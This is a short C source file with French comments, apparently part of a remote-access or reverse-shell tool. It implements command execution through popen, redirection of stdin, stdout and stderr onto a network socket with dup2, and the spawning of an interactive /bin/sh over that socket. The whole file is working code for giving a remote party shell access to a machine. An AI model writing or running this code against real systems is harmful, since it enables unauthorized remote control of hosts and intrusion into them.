#include "commands.h"

// Exécuter commande et capturer sortie
int execute_command(const char *cmd, char *output, size_t max_output) {
    DEBUG_PRINT("Executing: %s", cmd);
    
    FILE *fp = popen(cmd, "r");
    if (fp == NULL) {
        ERROR_PRINT("popen failed: %s", strerror(errno));
        return ERROR_SOCKET;
    }
    
    size_t total = 0;
    char buffer[256];
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL && total < max_output - 1) {
        size_t len = strlen(buffer);
        if (total + len < max_output) {
            strcat(output, buffer);
            total += len;
        }
    }
    
    int status = pclose(fp);
    DEBUG_PRINT("Command executed, output: %zu bytes", total);
    
    return status;
}

// Rediriger I/O vers socket
int redirect_io_to_socket(int sock) {
    if (dup2(sock, STDIN_FILENO) < 0) {
        ERROR_PRINT("dup2 stdin failed: %s", strerror(errno));
        return ERROR_SOCKET;
    }
    
    if (dup2(sock, STDOUT_FILENO) < 0) {
        ERROR_PRINT("dup2 stdout failed: %s", strerror(errno));
        return ERROR_SOCKET;
    }
    
    if (dup2(sock, STDERR_FILENO) < 0) {
        ERROR_PRINT("dup2 stderr failed: %s", strerror(errno));
        return ERROR_SOCKET;
    }
    
    DEBUG_PRINT("I/O redirected to socket");
    return SUCCESS;
}

// Spawn shell interactif
int spawn_shell(int sock) {
    // Rediriger I/O
    if (redirect_io_to_socket(sock) != SUCCESS) {
        return ERROR_SOCKET;
    }
    
    // Lancer shell
    char *args[] = {"/bin/sh", "-i", NULL};
    execve("/bin/sh", args, NULL);
    
    // Si execve retourne, c'est une erreur
    ERROR_PRINT("execve failed: %s", strerror(errno));
    return ERROR_SOCKET;
}

